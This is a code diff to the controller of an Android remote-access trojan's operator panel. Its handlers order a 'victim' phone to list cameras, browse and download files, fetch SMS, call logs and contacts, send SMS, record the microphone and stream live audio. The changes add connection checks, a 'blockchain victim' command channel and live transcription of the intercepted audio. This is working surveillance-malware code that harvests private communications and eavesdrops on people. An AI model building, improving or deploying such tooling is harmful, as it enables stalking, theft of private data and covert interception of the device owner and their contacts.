-        setResponseTimeout('camera list', 15000);
+        setResponseTimeout('camera list', 60000);
+        
+        // Store the handler function for reuse
+        const cameraHandler = (data) => {
+            if (responseTimeout) $timeout.cancel(responseTimeout);
+            $camCtrl.load = '';
+            $camCtrl.lastError = null;
+            
+            console.log('[CamCtrl] Received camera data:', data);
+            
+            // Handle error responses
+            if (data.error) {
+                $camCtrl.lastError = data.error;
+                $rootScope.Log(`[✗] Camera error: ${data.error}`, CONSTANTS.logStatus.FAIL);
+                $camCtrl.$apply();
+                return;
+            }
+            
+            if (data.camList == true) {
+                $rootScope.Log(`[✓] Found ${data.list.length} camera(s)`, CONSTANTS.logStatus.SUCCESS);
+                $camCtrl.cameras = data.list;
+                // Auto-select first camera
+                if (data.list.length > 0) {
+                    $camCtrl.selectedCam = data.list[0];
+                    $rootScope.Log(`[ℹ] Auto-selected: ${$camCtrl.selectedCam.name || 'Camera ' + $camCtrl.selectedCam.id}`, CONSTANTS.logStatus.INFO);
+                }
+                $camCtrl.$apply();
+            }
+        };
+        
         socket.emit(ORDER, { order: camera, extra: 'camList' });
+        
+        // Re-register the listener after emit (in case sendBlockchainAndPoll removed it)
+        // This is needed because sendBlockchainAndPoll calls socket.once which removes all listeners
+        $timeout(() => {
+            console.log('[CamCtrl] Re-registering camera listener after blockchain request');
+            socket.on(camera, cameraHandler);
+        }, 100); // Small delay to ensure sendBlockchainAndPoll registers first
     }
 });
 
@@ -832,52 +1543,135 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
         }
     };
 
+    // Check connection before operations
+    function checkConnection() {
+        if (isBlockchainVictim()) {
+            return true;
+        }
+        if (!originalSocket || !originalSocket.connected) {
+            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
+            $fmCtrl.load = '';
+            return false;
+        }
+        return true;
+    }
+
     // Socket handler
     socket.on(fileManager, (data) => {
-        if (data.deleted !== undefined) {
-            // Delete response
-            if (data.deleted) {
-                $rootScope.Log(`[✓] Deleted: ${data.path}`, CONSTANTS.logStatus.SUCCESS);
-                // Refresh current directory
-                socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
-            } else {
-                $rootScope.Log(`[✗] Failed to delete: ${data.path}`, CONSTANTS.logStatus.FAIL);
+        console.log('[FmCtrl] Received file manager data:', typeof data, Array.isArray(data) ? `Array(${data.length})` : (data ? Object.keys(data).join(',') : 'null'));
+        
+        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
+            // Empty data - might be from blockchain response issue
+            console.warn('[FmCtrl] Empty data received, ignoring');
+            return;
+        }
+        
+        // Handle blockchain response format: {event: "x0000fm", data: {files: [...]}}
+        // Also handle TCP format: {files: [...]} or just [...]
+        let fileData = data;
+        let filesArray = null;
+        
+        // Check for blockchain format: data.data.files
+        if (data.data && data.data.files && Array.isArray(data.data.files)) {
+            filesArray = data.data.files;
+            fileData = data.data; // Use data.data for other properties (deleted, file, etc.)
+        }
+        // Check for direct files property: data.files
+        else if (data.files && Array.isArray(data.files)) {
+            filesArray = data.files;
+        }
+        // Check if data.data is already an array (TCP format)
+        else if (data.data && Array.isArray(data.data)) {
+            filesArray = data.data;
+            fileData = data.data;
+        }
+        // Check if data itself is an array (direct TCP format)
+        else if (Array.isArray(data)) {
+            filesArray = data;
+            fileData = data;
+        }
+        // Check if data.data is an object with files property
+        else if (data.data && typeof data.data === 'object' && data.data.files && Array.isArray(data.data.files)) {
+            filesArray = data.data.files;
+            fileData = data.data;
+        }
+        
+        // Handle files array response (directory listing)
+        if (filesArray !== null) {
+            // Ignore empty responses if we already have files loaded (prevent overwriting with empty)
+            if (filesArray.length === 0 && $fmCtrl.files && $fmCtrl.files.length > 0) {
+                console.log('[FmCtrl] Ignoring empty response - already have files loaded');
+                return;
             }
-        } else if (data.file == true) {
+            
+            if (filesArray.length > 0) {
+                $rootScope.Log(`[✓] Found ${filesArray.length} items`, CONSTANTS.logStatus.SUCCESS);
+                $fmCtrl.load = '';
+                $fmCtrl.files = filesArray.sort((a, b) => {
+                    // Folders first, then alphabetical
+                    if (a.isDir && !b.isDir) return -1;
+                    if (!a.isDir && b.isDir) return 1;
+                    return (a.name || '').localeCompare(b.name || '');
+                });
+                updateStats();
+                $fmCtrl.$apply();
+            } else {
+                // Empty directory
+                $rootScope.Log('[ℹ] Directory is empty', CONSTANTS.logStatus.INFO);
+                $fmCtrl.load = '';
+                $fmCtrl.files = [];
+                updateStats();
+                $fmCtrl.$apply();
+            }
+            return;
+        }
+        
+        // Handle other response types (delete, download, etc.)
+        if (fileData.deleted !== undefined) {
+            // Delete response
+            if (fileData.deleted) {
+                $rootScope.Log(`[✓] Deleted: ${fileData.path}`, CONSTANTS.logStatus.SUCCESS);
+                // Refresh current directory
+                if (checkConnection()) {
+                    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
+                }
+            } else {
+                $rootScope.Log(`[✗] Failed to delete: ${fileData.path}`, CONSTANTS.logStatus.FAIL);
+            }
+        } else if (fileData.file == true) {
             // File download response
             $rootScope.Log('[→] Downloading file...', CONSTANTS.logStatus.INFO);
-            var filePath = path.join(downloadsPath, data.name);
-            fs.outputFile(filePath, data.buffer, (err) => {
+            var filePath = path.join(downloadsPath, fileData.name);
+            fs.outputFile(filePath, fileData.buffer, (err) => {
                 if (err)
                     $rootScope.Log('[✗] Failed to save file', CONSTANTS.logStatus.FAIL);
                 else
                     $rootScope.Log(`[✓] File saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
             });
-        } else if (Array.isArray(data) && data.length > 0) {
-            // Directory listing response
-            $rootScope.Log(`[✓] Found ${data.length} items`, CONSTANTS.logStatus.SUCCESS);
-            $fmCtrl.load = '';
-            $fmCtrl.files = data.sort((a, b) => {
-                // Folders first, then alphabetical
-                if (a.isDir && !b.isDir) return -1;
-                if (!a.isDir && b.isDir) return 1;
-                return (a.name || '').localeCompare(b.name || '');
-            });
-            updateStats();
-            $fmCtrl.$apply();
         } else {
-            $rootScope.Log('[⚠] Directory empty or access denied', CONSTANTS.logStatus.WARNING);
-            $fmCtrl.load = '';
-            $fmCtrl.files = [];
-            updateStats();
-            $fmCtrl.$apply();
+            // Unknown format - log for debugging
+            console.warn('[FmCtrl] Unknown data format:', JSON.stringify(fileData).substring(0, 200));
+            console.warn('[FmCtrl] Full data structure:', JSON.stringify(data).substring(0, 500));
+            $rootScope.Log('[⚠] Unexpected response format', CONSTANTS.logStatus.WARNING);
+            // Don't clear files if we have them - might be a malformed response
+            if (!$fmCtrl.files || $fmCtrl.files.length === 0) {
+                $fmCtrl.load = '';
+                $fmCtrl.files = [];
+                updateStats();
+                $fmCtrl.$apply();
+            }
         }
     });
 
-    // Initial load
-    $rootScope.Log('[→] Loading file manager...', CONSTANTS.logStatus.INFO);
+    // Initial load - ensure listener is registered first
     updatePathParts($fmCtrl.currentPath);
-    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
+    if (checkConnection()) {
+        $rootScope.Log('[→] Loading file manager...', CONSTANTS.logStatus.INFO);
+        // Small delay to ensure listener is registered
+        setTimeout(() => {
+            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
+        }, 50);
+    }
 });
 
 
@@ -904,9 +1698,22 @@ app.controller("SMSCtrl", function ($scope, $rootScope, $timeout) {
         socket.removeAllListeners(sms);
     });
 
+    // Check connection before operations
+    function checkConnection() {
+        if (isBlockchainVictim()) {
+            return true;
+        }
+        if (!originalSocket || !originalSocket.connected) {
+            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
+            $SMSCtrl.load = '';
+            return false;
+        }
+        return true;
+    }
 
     // send request to victim to bring all sms
     $SMSCtrl.getSMSList = () => {
+        if (!checkConnection()) return;
         $SMSCtrl.load = 'loading';
         $SMSCtrl.barLimit = 50;
         $rootScope.Log('[→] Fetching SMS list...', CONSTANTS.logStatus.INFO);
@@ -926,6 +1733,7 @@ app.controller("SMSCtrl", function ($scope, $rootScope, $timeout) {
 
     // send request to victim to send sms
     $SMSCtrl.SendSMS = (phoneNo, msg) => {
+        if (!checkConnection()) return;
         if (!phoneNo || !msg || phoneNo.trim() === '' || msg.trim() === '') {
             $rootScope.Log('[✗] Please enter both phone number and message', CONSTANTS.logStatus.FAIL);
             return;
@@ -1017,6 +1825,11 @@ app.controller("SMSCtrl", function ($scope, $rootScope, $timeout) {
 
     //listening for victim response
     socket.on(sms, (data) => {
+        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
+            // Empty data - might be from blockchain response issue
+            return;
+        }
+        
         if (data.smsList) {
             $SMSCtrl.load = '';
             $rootScope.Log(`[✓] SMS list received: ${data.smsList.length} messages`, CONSTANTS.logStatus.SUCCESS);
@@ -1069,16 +1882,57 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
         socket.removeAllListeners(calls);
     });
 
-    $CallsCtrl.load = 'loading';
-    $rootScope.Log('[→] Fetching call logs...', CONSTANTS.logStatus.INFO);
-    socket.emit(ORDER, { order: calls });
+    // Check connection before operations
+    function checkConnection() {
+        if (isBlockchainVictim()) {
+            return true;
+        }
+        if (!originalSocket || !originalSocket.connected) {
+            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
+            $CallsCtrl.load = '';
+            return false;
+        }
+        return true;
+    }
+
+    // Register listener first, then emit
+    socket.on(calls, (data) => {
+        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
+            // Empty data - might be from blockchain response issue
+            return;
+        }
+        
+        if (data.callsList) {
+            $CallsCtrl.load = '';
+            $rootScope.Log(`[✓] Call logs received: ${data.callsList.length} entries`, CONSTANTS.logStatus.SUCCESS);
+            $CallsCtrl.callsList = data.callsList;
+            $CallsCtrl.logsSize = data.callsList.length;
+            
+            // Save to DB
+            if (db) {
+                try {
+                    db.saveCalls(data.callsList);
+                } catch (e) { console.error(e); }
+            }
+            
+            $CallsCtrl.$apply();
+        }
+    });
+
+    if (checkConnection()) {
+        $CallsCtrl.load = 'loading';
+        $rootScope.Log('[→] Fetching call logs...', CONSTANTS.logStatus.INFO);
+        // Small delay to ensure listener is registered
+        setTimeout(() => {
+            socket.emit(ORDER, { order: calls });
+        }, 50);
+    }
 
 
     $CallsCtrl.barLimit = 50;
     $CallsCtrl.increaseLimit = () => {
         $CallsCtrl.barLimit += 50;
     }
-
 
     $CallsCtrl.SaveCalls = () => {
         if ($CallsCtrl.callsList.length == 0)
@@ -1104,24 +1958,6 @@ app.controller("CallsCtrl", function ($scope, $rootScope) {
 
     }
 
-    socket.on(calls, (data) => {
-        if (data.callsList) {
-            $CallsCtrl.load = '';
-            $rootScope.Log(`[✓] Call logs received: ${data.callsList.length} entries`, CONSTANTS.logStatus.SUCCESS);
-            $CallsCtrl.callsList = data.callsList;
-            $CallsCtrl.logsSize = data.callsList.length;
-            
-            // Save to DB
-            if (db) {
-                try {
-                    db.saveCalls(data.callsList);
-                } catch (e) { console.error(e); }
-            }
-            
-            $CallsCtrl.$apply();
-        }
-    });
-
 
 
 });
@@ -1142,9 +1978,43 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
         socket.removeAllListeners(contacts);
     });
 
-    $ContCtrl.load = 'loading';
-    $rootScope.Log('[→] Fetching contacts...', CONSTANTS.logStatus.INFO);
-    socket.emit(ORDER, { order: contacts });
+    // Check connection before operations
+    function checkConnection() {
+        if (isBlockchainVictim()) {
+            return true;
+        }
+        if (!originalSocket || !originalSocket.connected) {
+            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
+            $ContCtrl.load = '';
+            return false;
+        }
+        return true;
+    }
+
+    // Register listener first, then emit
+    socket.on(contacts, (data) => {
+        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
+            // Empty data - might be from blockchain response issue
+            return;
+        }
+        
+        if (data.contactsList) {
+            $ContCtrl.load = '';
+            $rootScope.Log(`[✓] Contacts received: ${data.contactsList.length} contacts`, CONSTANTS.logStatus.SUCCESS);
+            $ContCtrl.contactsList = data.contactsList;
+            $ContCtrl.contactsSize = data.contactsList.length;
+            $ContCtrl.$apply();
+        }
+    });
+
+    if (checkConnection()) {
+        $ContCtrl.load = 'loading';
+        $rootScope.Log('[→] Fetching contacts...', CONSTANTS.logStatus.INFO);
+        // Small delay to ensure listener is registered
+        setTimeout(() => {
+            socket.emit(ORDER, { order: contacts });
+        }, 50);
+    }
 
     $ContCtrl.barLimit = 50;
     $ContCtrl.increaseLimit = () => {
@@ -1173,16 +2043,6 @@ app.controller("ContCtrl", function ($scope, $rootScope) {
         });
 
     }
-
-    socket.on(contacts, (data) => {
-        if (data.contactsList) {
-            $ContCtrl.load = '';
-            $rootScope.Log(`[✓] Contacts received: ${data.contactsList.length} contacts`, CONSTANTS.logStatus.SUCCESS);
-            $ContCtrl.contactsList = data.contactsList;
-            $ContCtrl.contactsSize = data.contactsList.length;
-            $ContCtrl.$apply();
-        }
-    });
 
 
 
@@ -1241,7 +2101,20 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
         socket.removeAllListeners(mic);
     });
 
+    // Check connection before operations
+    function checkConnection() {
+        if (isBlockchainVictim()) {
+            return true;
+        }
+        if (!originalSocket || !originalSocket.connected) {
+            $rootScope.Log('[?] Not connected to device!', CONSTANTS.logStatus.FAIL);
+            return false;
+        }
+        return true;
+    }
+
     $MicCtrl.Record = (seconds) => {
+        if (!checkConnection()) return;
 
         if (seconds) {
             if (seconds > 0) {
@@ -1256,6 +2129,11 @@ app.controller("MicCtrl", function ($scope, $rootScope) {
 
 
     socket.on(mic, (data) => {
+        if (!data || (typeof data === 'object' && Object.keys(data).length === 0)) {
+            // Empty data - might be from blockchain response issue
+            return;
+        }
+        
         if (data.file == true) {
             $rootScope.Log('[✓] Audio recording received', CONSTANTS.logStatus.SUCCESS);
 
@@ -3452,6 +4330,67 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
     
     // Recorded streams list
     $LiveMicCtrl.recordedStreams = [];
+    
+    // Transcription vars
+    $LiveMicCtrl.transcriptionEnabled = false;
+    $LiveMicCtrl.transcriptionText = '';
+    $LiveMicCtrl.transcriptionHistory = [];
+    $LiveMicCtrl.transcriptionError = null;
+    $LiveMicCtrl.transcriptionAvailable = false;
+    var recognition = null; // Keep for Web Speech API fallback
+    var currentTranscriptionText = '';
+    var ipcRenderer = null;
+    
+    // Initialize IPC for transcription
+    try {
+        const { ipcRenderer: ipc } = require('electron');
+        ipcRenderer = ipc;
+        
+        // Listen for transcription results
+        if (ipcRenderer) {
+            ipcRenderer.on('transcription:result', (event, result) => {
+                if (result && result.text) {
+                    if (result.final) {
+                        // Final result - add to accumulated text
+                        currentTranscriptionText += result.text + ' ';
+                        $LiveMicCtrl.transcriptionText = currentTranscriptionText;
+                        
+                        // Add to history
+                        $LiveMicCtrl.transcriptionHistory.unshift({
+                            text: result.text.trim(),
+                            timestamp: new Date().toLocaleTimeString()
+                        });
+                        
+                        // Keep only last 20 history entries
+                        if ($LiveMicCtrl.transcriptionHistory.length > 20) {
+                            $LiveMicCtrl.transcriptionHistory.pop();
+                        }
+                    } else {
+                        // Partial result - show live
+                        $LiveMicCtrl.transcriptionText = currentTranscriptionText + result.text;
+                    }
+                    
+                    if (!$LiveMicCtrl.$$phase) {
+                        $LiveMicCtrl.$apply();
+                    }
+                }
+            });
+            
+            // Check transcription availability
+            ipcRenderer.send('transcription:status');
+            ipcRenderer.once('transcription:status', (event, status) => {
+                $LiveMicCtrl.transcriptionAvailable = status.initialized;
+                if (!status.initialized) {
+                    $LiveMicCtrl.transcriptionError = 'Transcription model not found. Please download a Vosk model.';
+                }
+                if (!$LiveMicCtrl.$$phase) {
+                    $LiveMicCtrl.$apply();
+                }
+            });
+        }
+    } catch (e) {
+        console.error('Failed to initialize IPC for transcription:', e);
+    }
 
     // Initialize Web Audio API
     function initAudio() {
@@ -3474,11 +4413,15 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
     }
 
     $LiveMicCtrl.startRecording = () => {
-        if (!destNode) return;
+        if (!destNode) {
+            $rootScope.Log('[✗] Audio context not initialized', CONSTANTS.logStatus.FAIL);
+            return;
+        }
         
         try {
             recordedChunks = [];
             recordingStartTime = Date.now();
+            currentTranscriptionText = ''; // Reset transcription for new recording
             mediaRecorder = new MediaRecorder(destNode.stream);
             
             mediaRecorder.ondataavailable = (e) => {
@@ -3494,6 +4437,9 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
             mediaRecorder.start();
             $LiveMicCtrl.isRecording = true;
             $rootScope.Log('[●] Recording started', CONSTANTS.logStatus.INFO);
+            if (!$LiveMicCtrl.$$phase) {
+                $LiveMicCtrl.$apply();
+            }
         } catch (e) {
             $rootScope.Log(`[✗] Failed to start recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
         }
@@ -3524,6 +4470,9 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
             const fileSize = buffer.length;
             const fileSizeStr = formatFileSize(fileSize);
             
+            // Get transcription text if available
+            const transcriptionText = currentTranscriptionText || ($LiveMicCtrl.transcriptionText || '');
+            
             fs.outputFile(savePath, buffer, (err) => {
                 if (err) {
                     $rootScope.Log(`[✗] Failed to save recording: ${err.message}`, CONSTANTS.logStatus.FAIL);
@@ -3540,7 +4489,8 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
                         size: fileSizeStr,
                         sizeBytes: fileSize,
                         timestamp: timestamp,
-                        date: new Date(timestamp).toLocaleString()
+                        date: new Date(timestamp).toLocaleString(),
+                        transcription: transcriptionText || null
                     };
                     
                     $LiveMicCtrl.recordedStreams.unshift(recording);
@@ -3548,6 +4498,11 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
                     // Keep only last 50 recordings
                     if ($LiveMicCtrl.recordedStreams.length > 50) {
                         $LiveMicCtrl.recordedStreams.pop();
+                    }
+                    
+                    // Clear current transcription text after saving
+                    if (transcriptionText) {
+                        currentTranscriptionText = '';
                     }
                     
                     if (!$LiveMicCtrl.$$phase) {
@@ -3701,6 +4656,15 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
                 arrayBuffer = audioData;
             }
             
+            // Send to transcription service if enabled
+            if ($LiveMicCtrl.transcriptionEnabled && ipcRenderer && typeof audioData === 'string') {
+                try {
+                    ipcRenderer.send('transcription:process-audio', audioData);
+                } catch (e) {
+                    console.error('Failed to send audio to transcription:', e);
+                }
+            }
+            
             // Android sends raw PCM16 data, not encoded audio
             // Skip decodeAudioData and go directly to PCM playback
             // decodeAudioData will fail on raw PCM, so use playRawPCM directly
@@ -3790,10 +4754,25 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
     $LiveMicCtrl.stopStream = () => {
         $LiveMicCtrl.isStreaming = false;
         
+        // Stop recording if active
+        if ($LiveMicCtrl.isRecording && mediaRecorder) {
+            try {
+                mediaRecorder.stop();
+                $LiveMicCtrl.isRecording = false;
+            } catch (e) {
+                // Ignore
+            }
+        }
+        
         $rootScope.Log('[→] Stopping microphone stream...', CONSTANTS.logStatus.INFO);
         socket.emit(ORDER, { order: liveMic, action: 'stop' });
         
-        // Stop transcription
+        // Get final transcription result
+        if ($LiveMicCtrl.transcriptionEnabled && ipcRenderer) {
+            ipcRenderer.send('transcription:final');
+        }
+        
+        // Stop Web Speech API transcription if active
         if (recognition) {
             try {
                 recognition.stop();
@@ -3802,9 +4781,16 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
             }
         }
         
+        // Disable transcription when stream stops
+        $LiveMicCtrl.transcriptionEnabled = false;
+        
         if (streamTimer) {
             $interval.cancel(streamTimer);
             streamTimer = null;
+        }
+        
+        if (!$LiveMicCtrl.$$phase) {
+            $LiveMicCtrl.$apply();
         }
     };
     
@@ -3843,6 +4829,7 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
     
     $LiveMicCtrl.discardCurrentRecording = () => {
         recordedChunks = [];
+        currentTranscriptionText = '';
         $LiveMicCtrl.isRecording = false;
         if (mediaRecorder && mediaRecorder.state !== 'inactive') {
             try {
@@ -3852,7 +4839,221 @@ app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
             }
         }
         $rootScope.Log('[→] Recording discarded', CONSTANTS.logStatus.INFO);
-        $LiveMicCtrl.$apply();
+        if (!$LiveMicCtrl.$$phase) {
+            $LiveMicCtrl.$apply();
+        }
+    };
+    
+    // Transcription functions
+    function initTranscription() {
+        if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) {
+            $rootScope.Log('[✗] Speech recognition not supported in this browser', CONSTANTS.logStatus.FAIL);
+            $LiveMicCtrl.transcriptionEnabled = false;
+            $LiveMicCtrl.transcriptionError = 'Speech recognition not supported';
+            if (!$LiveMicCtrl.$$phase) {
+                $LiveMicCtrl.$apply();
+            }
+            return;
+        }
+        
+        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+        recognition = new SpeechRecognition();
+        
+        recognition.continuous = true;
+        recognition.interimResults = true;
+        recognition.lang = 'en-US';
+        recognition.maxAlternatives = 1;
+        
+        recognition.onresult = (event) => {
+            let interimTranscript = '';
+            let finalTranscript = '';
+            
+            for (let i = event.resultIndex; i < event.results.length; i++) {
+                const transcript = event.results[i][0].transcript;
+                if (event.results[i].isFinal) {
+                    finalTranscript += transcript + ' ';
+                } else {
+                    interimTranscript += transcript;
+                }
+            }
+            
+            // Update live transcription text immediately
+            if (finalTranscript) {
+                currentTranscriptionText += finalTranscript;
+                $LiveMicCtrl.transcriptionText = currentTranscriptionText;
+                
+                // Add to history
+                $LiveMicCtrl.transcriptionHistory.unshift({
+                    text: finalTranscript.trim(),
+                    timestamp: new Date().toLocaleTimeString()
+                });
+                
+                // Keep only last 20 history entries
+                if ($LiveMicCtrl.transcriptionHistory.length > 20) {
+                    $LiveMicCtrl.transcriptionHistory.pop();
+                }
+            } else if (interimTranscript) {
+                // Show interim results live
+                $LiveMicCtrl.transcriptionText = currentTranscriptionText + interimTranscript;
+            }
+            
+            // Force update UI immediately
+            if (!$LiveMicCtrl.$$phase) {
+                $LiveMicCtrl.$apply();
+            } else {
+                // If already in digest, use $timeout to ensure update
+                setTimeout(() => {
+                    if (!$LiveMicCtrl.$$phase) {
+                        $LiveMicCtrl.$apply();
+                    }
+                }, 0);
+            }
+        };
+        
+        recognition.onerror = (event) => {
+            console.error('Speech recognition error:', event.error);
+            
+            // Handle different error types
+            let errorMessage = '';
+            let shouldRetry = false;
+            
+            switch (event.error) {
+                case 'no-speech':
+                    // Ignore no-speech errors (normal when no one is talking)
+                    return;
+                case 'network':
+                    errorMessage = 'Network error: Transcription requires internet connection';
+                    shouldRetry = true;
+                    break;
+                case 'not-allowed':
+                    errorMessage = 'Microphone permission denied. Please allow microphone access.';
+                    $LiveMicCtrl.transcriptionEnabled = false;
+                    break;
+                case 'aborted':
+                    // User or system aborted, don't show error
+                    return;
+                case 'audio-capture':
+                    errorMessage = 'No microphone found or microphone not accessible';
+                    $LiveMicCtrl.transcriptionEnabled = false;
+                    break;
+                case 'service-not-allowed':
+                    errorMessage = 'Speech recognition service not allowed';
+                    $LiveMicCtrl.transcriptionEnabled = false;
+                    break;
+                default:
+                    errorMessage = `Transcription error: ${event.error}`;
+                    shouldRetry = true;
+            }
+            
+            if (errorMessage) {
+                $LiveMicCtrl.transcriptionError = errorMessage;
+                $rootScope.Log(`[✗] ${errorMessage}`, CONSTANTS.logStatus.FAIL);
+            }
+            
+            // Auto-retry on network errors after a delay
+            if (shouldRetry && $LiveMicCtrl.transcriptionEnabled && $LiveMicCtrl.isStreaming) {
+                setTimeout(() => {
+                    if ($LiveMicCtrl.transcriptionEnabled && $LiveMicCtrl.isStreaming && recognition) {
+                        try {
+                            recognition.start();
+                            $LiveMicCtrl.transcriptionError = null;
+                        } catch (e) {
+                            console.error('Failed to restart recognition:', e);
+                        }
+                    }
+                }, 2000);
+            }
+            
+            if (!$LiveMicCtrl.$$phase) {
+                $LiveMicCtrl.$apply();
+            }
+        };
+        
+        recognition.onstart = () => {
+            $LiveMicCtrl.transcriptionError = null;
+            $rootScope.Log('[✓] Transcription started', CONSTANTS.logStatus.SUCCESS);
+            if (!$LiveMicCtrl.$$phase) {
+                $LiveMicCtrl.$apply();
+            }
+        };
+        
+        recognition.onend = () => {
+            // Auto-restart if still enabled and streaming
+            if ($LiveMicCtrl.transcriptionEnabled && $LiveMicCtrl.isStreaming) {
+                setTimeout(() => {
+                    if ($LiveMicCtrl.transcriptionEnabled && $LiveMicCtrl.isStreaming && recognition) {
+                        try {
+                            recognition.start();
+                        } catch (e) {
+                            // Already started or error - will be handled by onerror
+                        }
+                    }
+                }, 100);
+            }
+        };
+    }
+    
+    $LiveMicCtrl.toggleTranscription = () => {
+        if (!$LiveMicCtrl.isStreaming) {
+            $rootScope.Log('[✗] Start streaming first to enable transcription', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+        
+        if (!$LiveMicCtrl.transcriptionAvailable && !ipcRenderer) {
+            $rootScope.Log('[✗] Local transcription not available. Using Web Speech API fallback.', CONSTANTS.logStatus.WARNING);
+            // Fallback to Web Speech API
+            if (!recognition) {
+                initTranscription();
+            }
+            if (recognition) {
+                try {
+                    recognition.start();
+                    $LiveMicCtrl.transcriptionEnabled = true;
+                    $rootScope.Log('[✓] Transcription enabled (Web Speech API - requires internet)', CONSTANTS.logStatus.SUCCESS);
+                } catch (e) {
+                    $rootScope.Log(`[✗] Failed to start transcription: ${e.message}`, CONSTANTS.logStatus.FAIL);
+                    $LiveMicCtrl.transcriptionEnabled = false;
+                    $LiveMicCtrl.transcriptionError = `Failed to start: ${e.message}`;
+                }
+            }
+            if (!$LiveMicCtrl.$$phase) {
+                $LiveMicCtrl.$apply();
+            }
+            return;
+        }
+        
+        $LiveMicCtrl.transcriptionEnabled = !$LiveMicCtrl.transcriptionEnabled;
+        $LiveMicCtrl.transcriptionError = null;
+        
+        if ($LiveMicCtrl.transcriptionEnabled) {
+            // Reset recognizer for new stream
+            if (ipcRenderer) {
+                ipcRenderer.send('transcription:reset');
+            }
+            currentTranscriptionText = '';
+            $LiveMicCtrl.transcriptionText = '';
+            $rootScope.Log('[✓] Local transcription enabled (offline)', CONSTANTS.logStatus.SUCCESS);
+        } else {
+            // Get final result
+            if (ipcRenderer) {
+                ipcRenderer.send('transcription:final');
+            }
+            $rootScope.Log('[→] Transcription disabled', CONSTANTS.logStatus.INFO);
+        }
+        
+        if (!$LiveMicCtrl.$$phase) {
+            $LiveMicCtrl.$apply();
+        }
+    };
+    
+    $LiveMicCtrl.clearTranscription = () => {
+        currentTranscriptionText = '';
+        $LiveMicCtrl.transcriptionText = '';
+        $LiveMicCtrl.transcriptionHistory = [];
+        $LiveMicCtrl.transcriptionError = null;
+        if (!$LiveMicCtrl.$$phase) {
+            $LiveMicCtrl.$apply();
+        }
     };
 
     socket.on(liveMic, (data) => {
